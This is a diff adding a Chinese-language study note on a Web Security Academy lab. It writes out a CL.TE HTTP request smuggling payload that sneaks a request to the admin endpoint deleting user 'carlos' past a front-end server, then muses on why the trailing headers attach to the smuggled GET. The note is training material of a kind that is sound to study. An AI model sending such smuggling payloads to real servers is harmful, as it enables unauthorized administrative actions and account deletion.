@@ -1,1 +1,22 @@
+删除carlos账号
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 139
+Transfer-Encoding: chunked
 
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+
+因为知道前端用CL，后端用TE, 发送两次之后，把整个内容都发送过去，但是因为后端用的是TE，所以在GET /admin之前被截断了。所以后面的GET /admin变成一个新的请求。这里不太明白的点在于GET请求后面怎么携带了
+了下面这部分信息呢?
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
